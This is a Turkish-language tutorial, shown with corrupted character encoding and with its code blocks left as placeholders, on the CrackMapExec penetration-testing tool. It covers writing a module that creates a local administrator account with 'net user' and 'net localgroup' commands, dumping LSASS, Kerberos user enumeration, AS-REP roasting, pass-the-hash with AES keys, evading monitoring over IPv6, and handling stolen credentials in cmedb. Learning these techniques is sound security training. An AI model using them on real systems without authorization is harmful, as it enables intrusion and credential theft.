Åimdi kodu en sevdiÄŸimiz IDE ile aÃ§abiliriz. Bu bÃ¶lÃ¼mde [VSCode](https://code.visualstudio.com/) kullanacaÄŸÄ±z. VSCode'u [kurmak](https://code.visualstudio.com/download) iÃ§in .deb dosyasÄ±nÄ± kendi web sitesinden indirmemiz gerekiyor. DoÄŸrudan indirme baÄŸlantÄ±sÄ± [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un KurulmasÄ± ve Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ±

{{CODE_BLOCK_229}}

Daha sonra aÃ§mak iÃ§in `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni ModÃ¼lÃ¼mÃ¼zÃ¼ OluÅŸturun

ModÃ¼lÃ¼mÃ¼zÃ¼ oluÅŸturalÄ±m. Yeni bir administrator hesabÄ± oluÅŸturacak basit bir script oluÅŸturacaÄŸÄ±z.

* ./CrackMapExec/cme/modules klasÃ¶rÃ¼ altÄ±nda `createadmin.py` adÄ±nda bir dosya oluÅŸturun.
* AÅŸaÄŸÄ±daki kod Ã¶rneÄŸini dosyaya kopyalayÄ±n:

{{CODE_BLOCK_231}}



* Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ Ã¶zelleÅŸtirelim.

BazÄ± deÄŸiÅŸkenleri tanÄ±mlamamÄ±z gerekiyor:

* `name`, modÃ¼l adÄ±nÄ± nasÄ±l Ã§aÄŸÄ±racaÄŸÄ±mÄ±zÄ± belirtir. Bu durumda, `createadmin` dosya adÄ±nÄ± kullanacaÄŸÄ±z.
* `description` modÃ¼lÃ¼n amacÄ± iÃ§in kÄ±sa bir aÃ§Ä±klamadÄ±r. Biz bunu `Create a new administrator account` ayarlayacaÄŸÄ±z.
* `supported_protocols`, modÃ¼lÃ¼ kullanmak iÃ§in desteklenen protokolÃ¼n bir dizisidir. Biz sadece `SMB` kullanacaÄŸÄ±z.
* `opsec_safe`, modÃ¼lÃ¼n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ±n gÃ¼venli olduÄŸu anlamÄ±na gelen bir `True` veya `False` deÄŸeridir.
* `multiple_hosts`, bu modÃ¼lÃ¼ birden fazla hedefe karÅŸÄ± Ã§alÄ±ÅŸtÄ±rabileceÄŸimiz anlamÄ±na gelir.

AyrÄ±ca, modÃ¼l iÃ§in deÄŸiÅŸkenleri tanÄ±mlamak iÃ§in kullanÄ±lan `options()` methoduna da sahip olacaÄŸÄ±z. Bu durumda, `USER` ve `PASS` olmak Ã¼zere iki seÃ§enek ekleyeceÄŸiz. Her seÃ§eneÄŸin varsayÄ±lan deÄŸeri olabilir ya da olmayabilir. Bu yazara baÄŸlÄ±dÄ±r. USER iÃ§in varsayÄ±lan deÄŸeri dÃ¼z metin olarak ve PASS iÃ§in varsayÄ±lan deÄŸeri `asdasd123` . AyrÄ±ca USER o PASS modÃ¼l seÃ§eneÄŸinin boÅŸ olup olmadÄ±ÄŸÄ±nÄ± doÄŸrulamak iÃ§in bir kontrol ekledik. EÄŸer durum buysa, modÃ¼lden Ã§Ä±kÄ±lacaktÄ±r.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile Ã§alÄ±ÅŸacaÄŸÄ±z. Bu metot deÄŸiÅŸkenlerimizi almaktan ve hedeflere istediÄŸimiz herhangi bir gÃ¶revi yÃ¼rÃ¼tmekten sorumludur. Ã‡Ä±ktÄ± olarak `context.log.info` ve `context.log.highlight` metotlarÄ±nÄ± kullanacaÄŸÄ±z (farklÄ± renklere sahipler).

Bu execute iÃ§in, yÃ¶ntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z. Komutumuz, yeni bir kullanÄ±cÄ± eklemek iÃ§in `net user username password /add /Y` deÄŸeriyle ve kullanÄ±cÄ±yÄ± administrators grubuna eklemek iÃ§in `net localgroup administrators username /add` deÄŸeriyle command deÄŸiÅŸkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modÃ¼lÃ¼mÃ¼z ÅŸu ÅŸekilde gÃ¶rÃ¼nmelidir:

{{CODE_BLOCK_234}}


### ModÃ¼lÃ¼mÃ¼zÃ¼ Ã‡alÄ±ÅŸtÄ±rma

Åimdi modÃ¼lÃ¼mÃ¼zÃ¼ herhangi bir seÃ§enekle veya herhangi bir seÃ§enek olmadan Ã§alÄ±ÅŸtÄ±rabiliriz. Ã–nce varsayÄ±lan deÄŸerlerle Ã§alÄ±ÅŸtÄ±rarak sonuÃ§larÄ± gÃ¶relim.


### CME ModÃ¼lÃ¼mÃ¼zÃ¼n Ã‡alÄ±ÅŸtÄ±rÄ±lmasÄ± createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanÄ±cÄ± adÄ± hem de parola belirterek Ã§alÄ±ÅŸtÄ±rabiliriz.

{{CODE_BLOCK_236}}


Ä°lk modÃ¼lÃ¼mÃ¼z Ã§alÄ±ÅŸÄ±yor, ancak Ã§ok daha iyi olabilir. YÃ¼rÃ¼tmeyi iki komuta bÃ¶lebilir ve kullanÄ±cÄ± zaten oluÅŸturulmuÅŸsa veya ÅŸifre politikalara uymuyorsa bir hata gÃ¶sterebiliriz.

AyrÄ±ca `context.log.highlight(p)`'den deÄŸeri alabilir ve bir hata varsa farklÄ± bir ÅŸey gÃ¶sterebiliriz. Bu kodu geliÅŸtirmek iÃ§in fikirleriniz nelerdir?

### DiÄŸer Yazarlardan Ã–ÄŸrenmek

ArtÄ±k yeni bir modÃ¼l oluÅŸturmanÄ±n temellerini Ã¶ÄŸrendiÄŸimize gÃ¶re, diÄŸer modÃ¼lleri keÅŸfetmeli ve birkaÃ§ fikir edinmeliyiz.

Ã–rneÄŸin, `procdump.py` modÃ¼lÃ¼ `procdump.exe` Ã§alÄ±ÅŸtÄ±rÄ±labilir dosyasÄ±nÄ± bir `Base64` string olarak kaydeder, ardÄ±ndan Base64 stringini bir dosyaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r ve hedef iÅŸletim sisteminde tutar. LSASS'Ä±n iÅŸlem kimliÄŸini almak iÃ§in `tasklist` komutunu Ã§alÄ±ÅŸtÄ±rÄ±r, bunu bir deÄŸiÅŸkene kaydeder ve process kimliÄŸini procdump.exe'nin yÃ¼rÃ¼tÃ¼lmesine bir argÃ¼man olarak geÃ§irir.

BaÅŸka bir Ã¶rnek `get_description.py` . Bu modÃ¼lÃ¼ `groupmembership` modÃ¼lÃ¼nÃ¼ oluÅŸturmak iÃ§in Ã¶rnek olarak aldÄ±k. Bu modÃ¼l, bir sorgu gerÃ§ekleÅŸtirmek ve `memberOf` attribute'unu almak iÃ§in ihtiyaÃ§ duyduÄŸumuz gibi, sonuÃ§larÄ±nÄ± bir LDAP sorgusuna dayalÄ± olarak alÄ±r. Kodda bazÄ± deÄŸiÅŸiklikler yaptÄ±k, yeni bir modÃ¼l oluÅŸturduk ve bir pull request gÃ¶nderdik. Pull request kabul edildikten sonra tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir olacaktÄ±r.

Yeni modÃ¼ller oluÅŸturmak iÃ§in MSSQL gibi diÄŸer protokoller iÃ§in baÅŸka Ã¶rneklere de bakabiliriz.


### Pull Request OluÅŸturma

CrackMapExec gibi bir proje topluluk tarafÄ±ndan canlÄ± tutulur. ModÃ¼lÃ¼mÃ¼zÃ¼n tÃ¼m topluluk tarafÄ±ndan kullanÄ±labilir hale geleceÄŸi ve aracÄ±n kendisinin bir parÃ§asÄ± olarak dahil edileceÄŸi bir pull request'i ekleyerek projeye katkÄ±da bulunabiliriz.

Bir pull request'i yapmak iÃ§in [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kÄ±lavuzunu takip edebilir ve CrackMapExec'e katkÄ±da bulunabiliriz.

Ä°lerleyen bÃ¶lÃ¼mlerde, CrackMapExec kullanÄ±mÄ± iÃ§in `IPv6`, `Kerberos Kimlik DoÄŸrulama` ve `CrackMapExec` veritabanÄ±nda uzmanlaÅŸma gibi bazÄ± bonus konularÄ± tartÄ±ÅŸacaÄŸÄ±z.


### Ek CME Ä°ÅŸlevselliÄŸi

CrackMapExec, Ã§eÅŸitli senaryolarda Ã§ok faydalÄ± olacak baÅŸka yardÄ±mcÄ± programlara da sahiptir. Bu bÃ¶lÃ¼mde, bunlardan Ã¼Ã§Ã¼nÃ¼ inceleyeceÄŸiz:

* Audit mode
* IPv6 desteÄŸi
* Birden fazla cihaza saldÄ±rÄ±rken tamamlanma yÃ¼zdesi

### Audit Mode

5.3.0 sÃ¼rÃ¼mÃ¼nde yeni bir mod eklendi: `audit modu`. Bu mod, ÅŸifreyi veya hash'i tercih ettiÄŸimiz bir karakterle veya hatta en sevdiÄŸimiz `emoji` ile deÄŸiÅŸtirir. Bu Ã¶zellik, bir mÃ¼ÅŸteri raporu yazarken ekran gÃ¶rÃ¼ntÃ¼sÃ¼nÃ¼n bulanÄ±klaÅŸmasÄ±nÄ± Ã¶nlemeye yardÄ±mcÄ± olur.

Audit modunu yapÄ±landÄ±rmak iÃ§in, varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunan yapÄ±landÄ±rma dosyasÄ±nÄ± dÃ¼zenlememiz ve `audit_mode` parametresini tercih ettiÄŸimiz karakterle deÄŸiÅŸtirmemiz gerekir. Bu karakter, CrackMapExec Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken parolanÄ±n veya hash'in yerini alacaktÄ±r. Bu Ã¶rnek iÃ§in `#` karakterini kullanacaÄŸÄ±z


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Åimdi Ã§alÄ±ÅŸtÄ±rabilir ve parolanÄ±n Ã§Ä±ktÄ±da `########` ile deÄŸiÅŸtirildiÄŸini gÃ¶rebiliriz.

{{CODE_BLOCK_238}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, Ã§alÄ±ÅŸtÄ±rma sonucundaki password `#` karakteri ile deÄŸiÅŸtirilir. Ancak, komut ÅŸifreyi gÃ¶sterir. Bu gibi durumlarda, istenen komutu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce parolayÄ± bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile EtkinleÅŸtirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diÄŸer yeteneÄŸi, IPv6 Ã¼zerinden iletiÅŸimi desteklemesidir. Ã‡oÄŸu organizasyon, IPv6'yÄ± varsayÄ±lan olarak etkinleÅŸtirmiÅŸtir, hatta bunu kullanmasalar bile, IPv6'nÄ±n log seviyesinde IPv4 kadar izlenmediÄŸi veya anlaÅŸÄ±lmadÄ±ÄŸÄ± durumlar da olabilir. Bu durum, aÄŸ saldÄ±rÄ±larÄ±nÄ±n gerÃ§ekleÅŸtirilmesi ve tespit edilmeden geÃ§mesi iÃ§in bir fÄ±rsat yaratÄ±r.

PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

